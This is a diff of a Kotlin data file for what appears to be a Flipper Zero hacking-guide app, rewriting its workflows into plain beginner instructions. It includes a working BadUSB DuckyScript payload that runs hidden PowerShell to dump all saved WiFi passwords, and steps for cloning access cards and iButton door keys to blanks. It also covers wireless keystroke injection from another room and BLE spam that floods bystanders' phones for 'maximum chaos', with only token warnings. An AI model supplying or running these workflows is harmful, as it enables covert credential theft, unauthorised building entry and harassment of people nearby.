-                    description = "NFC > Read again. Now Flipper tries your expanded dictionary. Should get full sector dump.",
-                    tips = listOf("If still partial: repeat Detect Reader with different reader or sector")
-                ),
-                WorkflowStep(
-                    stepNumber = 8,
-                    title = "Emulate Card",
-                    description = "NFC > Saved > select card > Emulate. Flipper acts as that card at readers.",
+                    title = "Emulate or Clone",
+                    description = "OPTION A — Emulate (use Flipper as the card):\nNFC → Saved → [card name] → Emulate. Hold Flipper to reader.\n\nOPTION B — Write to a blank Magic card:\nNFC → Saved → [card name] → Write. Hold blank Magic Gen1a card to Flipper back. Works as a physical copy.",
                     commands = listOf(
-                        Command("Emulate", "NFC > Saved > [name] > Emulate", Device.FLIPPER_CLI)
-                    )
-                ),
-                WorkflowStep(
-                    stepNumber = 9,
-                    title = "Clone to Magic Card",
-                    description = "NFC > Saved > select card > Write. Hold Magic Gen1a card against Flipper.",
-                    tips = listOf(
-                        "Magic card: purchase 'UID changeable MIFARE Classic' cards",
-                        "Gen1a cards work with most cloners",
-                        "Gen2 cards work with more strict readers but need different method"
-                    )
+                        Command("Emulate", "NFC → Saved → [name] → Emulate", Device.FLIPPER_CLI),
+                        Command("Write to Magic card", "NFC → Saved → [name] → Write", Device.FLIPPER_CLI)
+                    ),
+                    tips = listOf("Magic Gen1a cards: search 'UID changeable MIFARE card' on Amazon — about $3 each")
                 )
             )
         ),
 
         Workflow(
             id = "nfc_ntag",
-            title = "Read & Write NTAG Tags",
-            subtitle = "Clone NFC stickers, Amiibo figures, and NTAG213/215/216 tags",
+            title = "Copy NFC Stickers and Amiibo Figures",
+            subtitle = "Clone NTAG stickers, NFC business cards, and Nintendo Amiibo toys",
             categoryId = "nfc",
             hardware = listOf(Hardware.FLIPPER),
-            prerequisites = listOf("Flipper Zero", "Blank NTAG215 sticker (for Amiibo cloning)"),
+            prerequisites = listOf("Flipper Zero", "For writing: blank NTAG215 sticker (get NTAG215 for Amiibo, or NTAG213 for simple tags)"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
-                    title = "Read NTAG Tag",
-                    description = "NFC > Read. Flipper auto-detects NTAG213/215/216.",
+                    title = "Read the NFC Tag",
+                    description = "NFC → Read. Hold the tag or figure flat on the back of Flipper. These are much simpler than access cards — Flipper reads them instantly with no cracking needed.",
                     commands = listOf(
-                        Command("Read", "NFC > Read", Device.FLIPPER_CLI)
+                        Command("Read tag", "NFC → Read", Device.FLIPPER_CLI)
                     ),
                     tips = listOf(
-                        "NTAG shows all pages/bytes — no encryption",
-                        "Common uses: NFC stickers, business cards, toy figures (Amiibo)"
+                        "NTAG215 is what Nintendo Amiibo uses",
+                        "Flipper shows all the data stored on the tag"
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 2,
-                    title = "Save and Emulate",
-                    description = "Save tag, then Emulate to use as that tag.",
-                    commands = listOf(
-                        Command("Emulate", "NFC > Saved > [name] > Emulate", Device.FLIPPER_CLI)
-                    )
+                    title = "Save It",
+                    description = "Press OK and give it a name. It's now saved on Flipper.",
+                    tips = listOf("You can use Flipper to emulate Amiibos in games — it works perfectly")
                 ),
                 WorkflowStep(
                     stepNumber = 3,
-                    title = "Write to Blank NTAG",
-                    description = "NFC > Saved > Write. Use blank NTAG stickers.",
-                    tips = listOf(
-                        "Amiibo cloning: save Amiibo tag, write to blank NTAG215",
-                        "Important: NTAG215 for Amiibo (capacity match)"
-                    )
-                )
-            )
-        ),
-
-        Workflow(
-            id = "nfc_emv",
-            title = "Read EMV Bank Card Data",
-            subtitle = "Read contactless payment card data via NFC",
-            categoryId = "nfc",
-            hardware = listOf(Hardware.FLIPPER),
-            prerequisites = listOf("Flipper Zero", "Contactless bank card"),
-            steps = listOf(
-                WorkflowStep(
-                    stepNumber = 1,
-                    title = "Read Bank Card",
-                    description = "NFC > Read. Hold bank card against Flipper back.",
+                    title = "Emulate (For Amiibo in Games)",
+                    description = "NFC → Saved → [tag name] → Emulate. Tap Flipper to your Nintendo Switch just like you'd tap the real Amiibo. The game thinks it's the real thing.",
                     commands = listOf(
-                        Command("Read", "NFC > Read", Device.FLIPPER_CLI)
-                    ),
-                    tips = listOf(
-                        "Flipper reads: masked card number, expiry date, recent transactions",
-                        "CANNOT clone — cryptographic challenge-response prevents fraud"
-                    )
-                ),
-                WorkflowStep(
-                    stepNumber = 2,
-                    title = "View Transaction Log",
-                    description = "Saved data shows card number (last 4 digits shown), expiry, some transaction amounts",
-                    warning = "Reading someone else's card without permission is illegal",
-                    tips = listOf(
-                        "For own cards only: useful to verify contactless data exposure",
-                        "Modern cards: limited data exposed via NFC"
-                    )
-                )
-            )
-        ),
-
-        Workflow(
-            id = "badusb_basic",
-            title = "Run BadUSB Payload via USB",
-            subtitle = "Execute a DuckyScript keyboard injection payload via USB",
-            categoryId = "badusb",
-            hardware = listOf(Hardware.FLIPPER),
-            prerequisites = listOf("Flipper Zero", "USB-C to USB-A cable", "DuckyScript .txt payload"),
-            steps = listOf(
-                WorkflowStep(
-                    stepNumber = 1,
-                    title = "Create or Download Payload",
-                    description = "Create a DuckyScript .txt payload file or download from community.",
-                    tips = listOf(
-                        "Save as .txt file",
-                        "GitHub: I-Am-Jakoby/Flipper-Zero-BadUSB — comprehensive payloads",
-                        "GitHub: Zarcolio/flipperzero — Windows/Linux payloads",
-                        "GitHub: narstybits/MacOS-DuckyScripts — 100+ macOS payloads"
-                    )
-                ),
-                WorkflowStep(
-                    stepNumber = 2,
-                    title = "Upload Payload to Flipper",
-                    description = "Connect Flipper via USB. Copy .txt payload to /ext/badusb/ on SD card.",
-                    commands = listOf(
-                        Command("Copy path", "/ext/badusb/your_payload.txt", Device.FLIPPER_CLI)
-                    )
-                ),
-                WorkflowStep(
-                    stepNumber = 3,
-                    title = "Select Payload",
-                    description = "Flipper: Bad USB > select your payload file.",
-                    commands = listOf(
-                        Command("Navigate", "Main Menu > Bad USB > [your_payload.txt]", Device.FLIPPER_CLI)
+                        Command("Emulate", "NFC → Saved → [name] → Emulate", Device.FLIPPER_CLI)
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 4,
-                    title = "Connect to Target Computer",
-                    description = "Connect Flipper to target computer via USB-C to USB-A cable.",
-                    warning = "Only perform on computers you own",
+                    title = "Write to a Blank Tag",
+                    description = "To make a physical copy: NFC → Saved → [tag name] → Write. Hold a blank NTAG sticker to the back of Flipper. It writes the copy in 2 seconds.",
                     tips = listOf(
-                        "Flipper auto-recognized as HID keyboard — no drivers needed",
-                        "Works on Windows, macOS, Linux, Android"
+                        "For Amiibo: must use NTAG215 blank stickers (not NTAG213!)",
+                        "Search 'NTAG215 NFC stickers' on Amazon — about $10 for 20 pieces"
+                    )
+                )
+            )
+        ),
+
+        // ── BADUSB ─────────────────────────────────────────────────────────────
+
+        Workflow(
+            id = "badusb_basic",
+            title = "Run a Keyboard Hack (BadUSB)",
+            subtitle = "Make Flipper type commands on any computer automatically",
+            categoryId = "badusb",
+            hardware = listOf(Hardware.FLIPPER),
+            prerequisites = listOf("Flipper Zero", "USB-C to USB-A cable (to plug Flipper into a computer)", "A script file (.txt) placed on Flipper's SD card"),
+            steps = listOf(
+                WorkflowStep(
+                    stepNumber = 1,
+                    title = "How This Works",
+                    description = "When you plug Flipper into a computer via USB, the computer thinks it's a keyboard. Then Flipper 'types' commands super fast — way faster than any human. This is how hackers run code on locked computers.\n\nYou can download pre-made scripts or write your own.",
+                    tips = listOf("Flipper shows up as a regular USB keyboard — no special software needed on the target computer")
+                ),
+                WorkflowStep(
+                    stepNumber = 2,
+                    title = "Get a Script File",
+                    description = "Scripts are simple .txt files written in 'DuckyScript' language. You can:\nA) Download pre-made ones from GitHub: github.com/I-Am-Jakoby/Flipper-Zero-BadUSB\nB) Write your own (see the DuckyScript section in Cheat Sheet tab)\n\nSave the .txt file to your phone.",
+                    tips = listOf(
+                        "The GitHub repo above has 50+ ready-to-use scripts",
+                        "Scripts are just text files — open in any text editor to see what they do"
+                    )
+                ),
+                WorkflowStep(
+                    stepNumber = 3,
+                    title = "Copy Script to Flipper",
+                    description = "Connect Flipper to your phone via USB. On your phone's file manager, go to Flipper's storage. Navigate to 'badusb' folder. Copy your .txt script file into this folder.",
+                    commands = listOf(
+                        Command("Script destination folder", "/ext/badusb/", Device.FLIPPER_CLI)
+                    )
+                ),
+                WorkflowStep(
+                    stepNumber = 4,
+                    title = "Load the Script on Flipper",
+                    description = "On Flipper: press the middle button → scroll to 'Bad USB' → press OK → you'll see your script file listed → press OK on it.",
+                    commands = listOf(
+                        Command("Open BadUSB menu", "Main Menu → Bad USB → [your script]", Device.FLIPPER_CLI)
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 5,
-                    title = "Execute Payload",
-                    description = "Press OK on Flipper to execute payload. Watch execution.",
+                    title = "Plug Into Computer and Run",
+                    description = "Plug Flipper into the TARGET computer via USB. Wait 2-3 seconds for the computer to recognize it. Then press OK on Flipper. Watch it type everything automatically.",
+                    warning = "Only run this on computers you own or have written permission to test",
                     tips = listOf(
-                        "DELAY 1000 at start allows computer to recognize device",
-                        "GUI r = Windows key + R = Run dialog"
+                        "DELAY 1000 at the start of scripts = wait 1 second (gives computer time to recognize Flipper)",
+                        "If it types too fast: add DELAY commands between lines"
                     )
                 )
             )
@@ -1109,213 +933,208 @@ object WorkflowRepository {
 
         Workflow(
             id = "badusb_wifi_grab",
-            title = "WiFi Password Grabber (Windows)",
-            subtitle = "Extract all saved WiFi passwords from a Windows PC via BadUSB",
+            title = "Steal Saved WiFi Passwords (Windows)",
+            subtitle = "Run a script that dumps all saved WiFi passwords to a file",
             categoryId = "badusb",
             hardware = listOf(Hardware.FLIPPER),
-            prerequisites = listOf("Flipper Zero", "USB cable", "Windows target PC"),
+            prerequisites = listOf("Flipper Zero", "USB cable", "A Windows PC (your own!)"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
-                    title = "Create WiFi Grabber Payload",
-                    description = "Create this DuckyScript payload:",
+                    title = "Create the Script",
+                    description = "On your phone or PC, create a new text file. Name it 'wifi_grab.txt'. Paste this exact text into it:",
                     commands = listOf(
                         Command(
-                            "WiFi grabber payload",
+                            "WiFi password grabber script",
                             "DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -c \"(netsh wlan show profiles) | Select-String 'All User Profile' | %{\$n=(\$_ -split ':')[1].Trim(); (netsh wlan show profile name=\$n key=clear)} | Select-String 'Key Content' | Out-File \$env:USERPROFILE\\Desktop\\wifi_passwords.txt\"\nENTER",
                             Device.PC
                         )
                     ),
-                    tips = listOf("This dumps all saved WiFi passwords to Desktop/wifi_passwords.txt")
+                    tips = listOf(
+                        "This script: opens Run dialog → runs a hidden PowerShell command → saves all WiFi passwords to Desktop/wifi_passwords.txt",
+                        "Only works on Windows"
+                    ),
+                    warning = "Only run this on your own computer"
                 ),
                 WorkflowStep(
                     stepNumber = 2,
-                    title = "Upload and Execute",
-                    description = "Upload to /ext/badusb/ and execute on Windows target.",
-                    tips = listOf(
-                        "File appears on Desktop automatically",
-                        "Hidden PowerShell window — subtle execution"
-                    )
+                    title = "Copy to Flipper and Run",
+                    description = "Copy wifi_grab.txt to /ext/badusb/ on Flipper's SD card. Load it in BadUSB menu. Plug into Windows computer. Press OK.\n\nIn about 3 seconds, a file called 'wifi_passwords.txt' will appear on the computer's Desktop with all saved WiFi passwords.",
+                    tips = listOf("The PowerShell window is hidden — you won't see it running")
                 )
             )
         ),
 
         Workflow(
             id = "badusb_ble",
-            title = "Run BadUSB Wirelessly via BLE",
-            subtitle = "Execute HID keyboard payloads over Bluetooth without a cable",
+            title = "Run BadUSB Wirelessly (No Cable Needed)",
+            subtitle = "Execute keyboard scripts over Bluetooth — no physical connection",
             categoryId = "badusb",
             hardware = listOf(Hardware.FLIPPER),
-            prerequisites = listOf("Flipper Zero with Bluetooth", "Target computer with Bluetooth"),
+            prerequisites = listOf("Flipper Zero", "Target computer has Bluetooth"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
-                    title = "Enable Bluetooth on Flipper",
-                    description = "Settings > Bluetooth > Bluetooth > ON",
+                    title = "Turn On Flipper Bluetooth",
+                    description = "Settings → Bluetooth → Bluetooth → ON",
                     commands = listOf(
-                        Command("Enable BT", "Settings > Bluetooth > Bluetooth > ON", Device.FLIPPER_CLI)
+                        Command("Enable BT", "Settings → Bluetooth → Bluetooth → ON", Device.FLIPPER_CLI)
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 2,
-                    title = "Load Payload in BLE Mode",
-                    description = "Bad USB > select payload > 'Connect via BT' (instead of USB)",
+                    title = "Load Script in BLE Mode",
+                    description = "Go to: Main Menu → Bad USB → select your script file. Then instead of just pressing OK to run it, look for the 'Connect via BT' option at the bottom. Select that.",
                     commands = listOf(
-                        Command("BLE mode", "Bad USB > [payload] > Connect via BT", Device.FLIPPER_CLI)
+                        Command("Select BLE mode", "Bad USB → [script] → Connect via BT", Device.FLIPPER_CLI)
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 3,
-                    title = "Pair with Target",
-                    description = "Target computer shows Flipper as Bluetooth keyboard. Pair it.",
+                    title = "Pair with Target Computer",
+                    description = "On the target computer, open Bluetooth settings. You'll see 'Flipper Keyboard' appear. Click 'Pair'. The computer now thinks Flipper is a Bluetooth keyboard.",
                     tips = listOf(
-                        "No USB cable needed",
-                        "Range: ~10 meters",
-                        "Works through walls at close range"
+                        "Works up to about 30 feet away",
+                        "You can be in another room!"
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 4,
-                    title = "Execute Payload",
-                    description = "Press OK on Flipper. Payload executes on target computer wirelessly.",
-                    tips = listOf(
-                        "Flipper appears as 'Flipper Keyboard' in BT devices",
-                        "Can unpair after execution to reduce traces"
-                    )
+                    title = "Run the Script",
+                    description = "Once paired, press OK on Flipper. The script runs exactly the same as USB mode — but wirelessly.",
+                    tips = listOf("The Flipper doesn't need to be near the computer once paired — just in Bluetooth range")
                 )
             )
         ),
 
+        // ── BLUETOOTH ──────────────────────────────────────────────────────────
+
         Workflow(
             id = "ble_spam",
-            title = "BLE Spam — Notification Flood",
-            subtitle = "Flood nearby iOS, Android, and Windows devices with BLE popups",
+            title = "Spam Bluetooth Notifications on Nearby Phones",
+            subtitle = "Flood iPhones, Androids, and Windows devices with BLE popups",
             categoryId = "bluetooth",
             hardware = listOf(Hardware.FLIPPER, Hardware.AWOK),
             prerequisites = listOf("Flipper Zero with Momentum firmware OR AWOK with Marauder"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
-                    title = "Launch BLE Spam on Flipper",
-                    description = "Apps > Bluetooth > BLE Spam",
+                    title = "BLE Spam on Flipper (Best Option)",
+                    description = "On Flipper with Momentum firmware:\nApps → Bluetooth → BLE Spam\n\nPress OK to open it. You'll see a menu with different attack types.",
                     commands = listOf(
-                        Command("Navigate", "Apps > Bluetooth > BLE Spam", Device.FLIPPER_CLI)
+                        Command("Open BLE Spam", "Apps → Bluetooth → BLE Spam", Device.FLIPPER_CLI)
                     ),
                     tips = listOf(
-                        "Requires Momentum or Unleashed firmware",
-                        "Not in official firmware"
+                        "This app is ONLY in Momentum/Unleashed firmware",
+                        "Not available in stock official firmware"
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 2,
-                    title = "Select Target Device Type",
-                    description = "Choose target:",
-                    tips = listOf(
-                        "iOS: AirDrop spam, AirPods spam, Apple Watch pairing",
-                        "Android: Google Fast Pair (fake earbuds), Samsung Galaxy devices",
-                        "Windows: Nearby Share notification spam"
-                    )
+                    title = "Pick Your Target",
+                    description = "Choose what kind of devices you want to annoy:\n• iOS: 'AirDrop Transfer' — makes iPhones show repeated AirDrop popups\n• iOS: 'AirPods Pairing' — fake AirPods pairing notifications on iPhones\n• Android: 'Android Fast Pair' — fake Google earbuds notifications\n• Windows: 'Nearby Share' — fake file sharing popups\n• Samsung: 'Galaxy Device' spam"
                 ),
                 WorkflowStep(
                     stepNumber = 3,
-                    title = "Run Spam Attack",
-                    description = "Select attack type and press OK. Flipper floods area with BLE advertisements.",
-                    warning = "Can drain nearby device batteries and cause annoyance",
-                    tips = listOf(
-                        "iOS devices show popup notifications repeatedly",
-                        "Android shows 'New device found' repeatedly"
-                    )
+                    title = "Run It",
+                    description = "Select your attack type. Press OK. Flipper starts broadcasting and everyone nearby starts getting popups on their phone. They're harmless — just annoying.",
+                    warning = "Don't use this in schools, hospitals, or anywhere it could cause distraction",
+                    tips = listOf("Works within about 30 feet (Bluetooth range)")
                 ),
                 WorkflowStep(
                     stepNumber = 4,
-                    title = "AWOK BLE Spam Alternative",
-                    description = "Alternatively via AWOK Marauder:",
+                    title = "BLE Spam via AWOK (Alternative)",
+                    description = "If you prefer using AWOK: open Marauder terminal and type 'blespam'. The AWOK has a stronger radio than Flipper so it covers more distance.",
                     commands = listOf(
-                        Command("BLE spam", "blespam", Device.MARAUDER)
-                    ),
-                    tips = listOf("AWOK has higher BLE output power than Flipper")
+                        Command("AWOK BLE spam", "blespam", Device.MARAUDER)
+                    )
+                ),
+                WorkflowStep(
+                    stepNumber = 5,
+                    title = "Double Spam — Both at Once",
+                    description = "Run BLE Spam on Flipper AND type 'blespam' on AWOK at the same time. Now you have two different devices flooding the area with different spam packets simultaneously. Maximum chaos.",
+                    tips = listOf("Flipper and AWOK can run independently at the same time")
                 )
             )
         ),
 
         Workflow(
             id = "bt_scan",
-            title = "Bluetooth Device Scanning",
-            subtitle = "Enumerate nearby Bluetooth Classic and BLE devices",
+            title = "Scan All Nearby Bluetooth Devices",
+            subtitle = "Find every Bluetooth device in range — trackers, headphones, locks",
             categoryId = "bluetooth",
             hardware = listOf(Hardware.FLIPPER, Hardware.AWOK),
-            prerequisites = listOf("AWOK with Marauder for BT Classic", "Flipper Zero for BLE scan"),
+            prerequisites = listOf("Flipper Zero AND/OR AWOK with Marauder"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
-                    title = "Scan Bluetooth Classic via AWOK",
-                    description = "Run Bluetooth sniffing on AWOK Marauder.",
-                    commands = listOf(
-                        Command("BT sniff", "sniffbt", Device.MARAUDER)
-                    ),
+                    title = "BLE Scan on Flipper",
+                    description = "On Flipper: Settings → Bluetooth → scroll to 'Scan' (or look for it in the BLE menu). Press OK. Flipper shows a live list of all Bluetooth Low Energy devices advertising nearby — with their names, MAC addresses, and signal strength.",
                     tips = listOf(
-                        "Shows nearby Bluetooth Classic devices (non-BLE)",
-                        "PCAP saved for offline analysis"
+                        "BLE = Bluetooth Low Energy — used by earbuds, fitness trackers, smart locks, AirTags",
+                        "You'll see exact model names like 'Galaxy Watch 4', 'Tile Mate', 'WH-1000XM5'"
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 2,
-                    title = "BLE Scan via Flipper",
-                    description = "On Flipper: Settings > Bluetooth > 'Scan'. Shows all BLE advertising devices with name, MAC, RSSI.",
-                    tips = listOf(
-                        "Identifies: AirTags (Apple), Tile trackers, Galaxy SmartTags, smart locks",
-                        "Shows exact manufacturer from BLE advertisement data"
-                    )
+                    title = "Find Hidden Trackers",
+                    description = "If you see an unknown 'airtag' or 'tile' or 'SmartTag' device that keeps following you — this is how you'd find it. The scan reveals tracking devices that you might not know about.",
+                    tips = listOf("AirTags show up as 'AirTag' or unnamed Apple devices")
+                ),
+                WorkflowStep(
+                    stepNumber = 3,
+                    title = "Bluetooth Classic Scan via AWOK",
+                    description = "For older Bluetooth Classic devices (not BLE): open Marauder terminal and type 'sniffbt'. This scans for classic Bluetooth devices like older speakers, keyboards, and phones.",
+                    commands = listOf(
+                        Command("Scan BT Classic", "sniffbt", Device.MARAUDER)
+                    ),
+                    tips = listOf("Save the PCAP file from the scan for later analysis")
                 )
             )
         ),
 
+        // ── INFRARED ───────────────────────────────────────────────────────────
+
         Workflow(
             id = "ir_learn",
-            title = "Learn & Replay IR Remote",
-            subtitle = "Teach Flipper any infrared remote and replay signals",
+            title = "Teach Flipper Any Remote Control",
+            subtitle = "Copy any TV, AC, projector, or IR remote into Flipper",
             categoryId = "infrared",
             hardware = listOf(Hardware.FLIPPER),
-            prerequisites = listOf("Flipper Zero", "Target IR remote"),
+            prerequisites = listOf("Flipper Zero", "The original remote you want to copy"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
                     title = "Open Infrared",
-                    description = "Navigate to the Infrared module.",
+                    description = "Main Menu → Infrared. This is where you teach Flipper remotes and replay them.",
                     commands = listOf(
-                        Command("Navigate", "Main Menu > Infrared", Device.FLIPPER_CLI)
+                        Command("Open menu", "Main Menu → Infrared", Device.FLIPPER_CLI)
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 2,
-                    title = "Start Learning Remote",
-                    description = "Infrared > Learn New Remote. Name it (e.g., 'LivingRoom_TV').",
+                    title = "Start Learning a New Remote",
+                    description = "Scroll to 'Learn New Remote'. Press OK. Type a name for this remote (like 'LivingRoom_TV'). Press OK.",
                     commands = listOf(
-                        Command("Learn", "Infrared > Learn New Remote", Device.FLIPPER_CLI)
+                        Command("Learn new remote", "Infrared → Learn New Remote", Device.FLIPPER_CLI)
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 3,
-                    title = "Capture Each Button",
-                    description = "Flipper shows 'Point remote and press button'. Press each remote button once.",
+                    title = "Copy Each Button",
+                    description = "Flipper says 'Point remote here and press a button'. Point your real remote at the front of your Flipper (the top end). Press one button. You'll see Flipper show 'Saved!' and ask you to name this button.\n\nRepeat for every button you want to copy.",
                     tips = listOf(
-                        "Flipper captures IR signal and auto-identifies carrier frequency",
-                        "Add all buttons: Power, Vol+/-, Mute, Input, Menu, etc.",
-                        "LED blinks when signal captured successfully"
+                        "Flipper's IR sensor is at the top edge of the device",
+                        "Point the remote AT Flipper from about 6-12 inches away",
+                        "Press the button once, clearly — don't hold it"
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 4,
-                    title = "Save Remote",
-                    description = "Press Back when done. Remote saved with all learned buttons.",
-                    tips = listOf("Save multiple remotes: TV, AC, projector, soundbar")
-                ),
-                WorkflowStep(
-                    stepNumber = 5,
-                    title = "Replay Button",
-                    description = "Infrared > Saved Remotes > select remote > select button > Send.",
+                    title = "Send Buttons",
+                    description = "To replay any button: Infrared → Saved Remotes → select your remote → scroll to button name → press OK → Send.\n\nPoint Flipper at the TV (or AC, projector, etc.) and the IR signal fires.",
                     commands = listOf(
-                        Command("Send", "Infrared > Saved Remotes > [name] > [button] > Send", Device.FLIPPER_CLI)
+                        Command("Send saved button", "Infrared → Saved Remotes → [remote] → [button] → Send", Device.FLIPPER_CLI)
                     )
                 )
             )
@@ -1323,8 +1142,8 @@ object WorkflowRepository {
 
         Workflow(
             id = "ir_universal",
-            title = "Universal IR Remote (All Brands)",
-            subtitle = "Control any TV or device using Flipper's built-in universal remote",
+            title = "Control Any TV (No Remote Needed)",
+            subtitle = "Use Flipper's built-in universal remote database — works on 95% of TVs",
             categoryId = "infrared",
             hardware = listOf(Hardware.FLIPPER),
             prerequisites = listOf("Flipper Zero"),
@@ -1332,391 +1151,337 @@ object WorkflowRepository {
                 WorkflowStep(
                     stepNumber = 1,
                     title = "Open Universal Remotes",
-                    description = "Navigate to Universal Remotes section.",
+                    description = "Infrared → Universal Remotes. You'll see categories: TV, Audio, AC, Fan, Projector.",
                     commands = listOf(
-                        Command("Navigate", "Infrared > Universal Remotes", Device.FLIPPER_CLI)
+                        Command("Universal remotes", "Infrared → Universal Remotes", Device.FLIPPER_CLI)
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 2,
-                    title = "Select Device Type",
-                    description = "Choose: TV, Audio/Amplifier, Air Conditioner, Fan, Projector",
+                    title = "Try Power Brute Force",
+                    description = "Select 'TV'. Then select 'TV Power Brute Force'. Point Flipper at the TV and press OK. Flipper cycles through EVERY power code for every TV brand ever made. When it hits the right one, the TV turns on or off.",
                     tips = listOf(
-                        "TV database includes: Samsung, LG, Sony, Philips, Panasonic, Vizio, TCL, Hisense, and 200+ more brands"
+                        "Works even if you don't know the TV brand",
+                        "Takes about 1-2 minutes to cycle through all brands",
+                        "Once you see it respond, quickly press back to stop cycling — you found the right code"
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 3,
-                    title = "Power Brute Force",
-                    description = "Select 'Power Brute' to cycle through all power codes. Works even if you don't know the brand.",
+                    title = "Use Specific Brand Buttons",
+                    description = "After power brute force finds the right brand, go back and select that brand specifically. Now you can use Vol+, Vol-, Mute, Input, etc.",
                     tips = listOf(
-                        "Cycles through all known TV power codes",
-                        "TV will turn on/off when matching code sent",
-                        "Works on >95% of TVs"
+                        "Samsung, LG, Sony, Vizio, TCL, Hisense, Panasonic — all in there",
+                        "If you know the brand: skip brute force and just select the brand directly"
                     )
-                ),
-                WorkflowStep(
-                    stepNumber = 4,
-                    title = "Volume Control",
-                    description = "After finding working brand, select Vol+/- for volume control.",
-                    tips = listOf("If brand not found: try 'Next' after each attempt")
                 )
             )
         ),
 
-        Workflow(
-            id = "ir_brute",
-            title = "IR Brute Force Unknown Device",
-            subtitle = "Capture and analyze IR signals from unknown equipment",
-            categoryId = "infrared",
-            hardware = listOf(Hardware.FLIPPER),
-            prerequisites = listOf("Flipper Zero", "Unknown IR device"),
-            steps = listOf(
-                WorkflowStep(
-                    stepNumber = 1,
-                    title = "Capture RAW IR Signal",
-                    description = "Infrared > Learn New Remote. Hold Flipper near unknown IR device while it sends a signal.",
-                    tips = listOf(
-                        "Works for any IR device: medical equipment, industrial controls, security panels"
-                    )
-                ),
-                WorkflowStep(
-                    stepNumber = 2,
-                    title = "Analyze RAW Signal",
-                    description = "RAW signals can be analyzed to find protocol.",
-                    tips = listOf(
-                        "Common IR protocols: NEC, Sony SIRC, RC5, RC6, Samsung",
-                        "Use IR scope app for detailed waveform analysis"
-                    )
-                )
-            )
-        ),
+        // ── iBUTTON ────────────────────────────────────────────────────────────
 
         Workflow(
             id = "ibutton_read",
-            title = "Read & Clone Dallas iButton Key",
-            subtitle = "Clone Dallas DS1990A iButton keys used in intercoms and access systems",
+            title = "Copy a Metal Contact Key (iButton)",
+            subtitle = "Clone Dallas iButton keys used in Russian intercoms and some access systems",
             categoryId = "ibutton",
             hardware = listOf(Hardware.FLIPPER),
-            prerequisites = listOf("Flipper Zero", "Target iButton key", "Blank DS1990A iButton (for clone)"),
+            prerequisites = listOf("Flipper Zero", "The iButton key to copy", "Optional: blank iButton to write a physical copy"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
-                    title = "Open iButton",
-                    description = "Navigate to the iButton module on Flipper.",
-                    commands = listOf(
-                        Command("Navigate", "Main Menu > iButton", Device.FLIPPER_CLI)
-                    )
+                    title = "What Is an iButton?",
+                    description = "iButtons are small metal discs (like a battery) used as keys — you touch them to a reader to open a door. Very common in Russian apartment buildings and some older US systems. Flipper has a special contact point to read them.",
+                    tips = listOf("Look for a small metal disc, usually on a keychain, that you touch to a black circular reader")
                 ),
                 WorkflowStep(
                     stepNumber = 2,
-                    title = "Read iButton Key",
-                    description = "iButton > Read. Touch iButton key to Flipper's TM connector (bottom-left metal contact).",
+                    title = "Open iButton on Flipper",
+                    description = "Main Menu → iButton → Read",
                     commands = listOf(
-                        Command("Read", "iButton > Read", Device.FLIPPER_CLI)
-                    ),
-                    tips = listOf(
-                        "TM connector = bottom left of Flipper (small metal square)",
-                        "iButton must make solid contact",
-                        "DS1990A (most common): reads in 1 second",
-                        "Cyfral/Metakom (intercom): also supported"
+                        Command("Open menu", "Main Menu → iButton → Read", Device.FLIPPER_CLI)
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 3,
-                    title = "Save Key",
-                    description = "Press OK. Name the key (e.g., 'Apartment_Main_Door')."
+                    title = "Touch Key to Flipper",
+                    description = "Look at the BOTTOM-LEFT corner of your Flipper. There's a small metal square contact point. Touch the iButton key FIRMLY to that metal square. Keep it in contact for 2-3 seconds.",
+                    tips = listOf(
+                        "The bottom-left metal contacts are called the 'TM connector'",
+                        "You need firm metal-to-metal contact — press gently"
+                    )
                 ),
                 WorkflowStep(
                     stepNumber = 4,
-                    title = "Emulate Key",
-                    description = "iButton > Saved > select key > Emulate. Touch Flipper connector to reader.",
+                    title = "Save and Emulate",
+                    description = "Flipper shows the key type and ID. Press OK to save. Name it.\n\nTo use Flipper AS the key: iButton → Saved → [key name] → Emulate. Touch Flipper's bottom-left contacts to the reader.",
                     commands = listOf(
-                        Command("Emulate", "iButton > Saved > [name] > Emulate", Device.FLIPPER_CLI)
-                    ),
-                    tips = listOf(
-                        "Hold Flipper connector to reader contact pad firmly",
-                        "Works on most Dallas key readers"
+                        Command("Emulate key", "iButton → Saved → [name] → Emulate", Device.FLIPPER_CLI)
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 5,
-                    title = "Clone to Blank iButton",
-                    description = "iButton > Saved > select key > Write > touch blank iButton to connector.",
+                    title = "Write to a Blank iButton (Physical Copy)",
+                    description = "To make a physical copy: iButton → Saved → [key name] → Write. Touch a blank DS1990A iButton to Flipper's bottom-left contacts. Flipper writes the key in 1 second.",
                     tips = listOf(
-                        "Blank iButtons: 'blank DS1990A iButton' on Amazon",
-                        "Clone creates physical copy of key"
+                        "Blank DS1990A iButtons: search Amazon for 'DS1990A blank iButton' — about $5 for 5 pieces",
+                        "The physical copy works on the actual door just like the original"
                     )
                 )
             )
         ),
+
+        // ── GPIO ───────────────────────────────────────────────────────────────
 
         Workflow(
             id = "gpio_uart",
-            title = "GPIO UART Serial Bridge",
-            subtitle = "Use Flipper as a UART serial bridge to access embedded device consoles",
+            title = "Hack a Device's Serial Console via GPIO",
+            subtitle = "Use Flipper as a UART bridge to access router and device consoles",
             categoryId = "gpio",
             hardware = listOf(Hardware.FLIPPER),
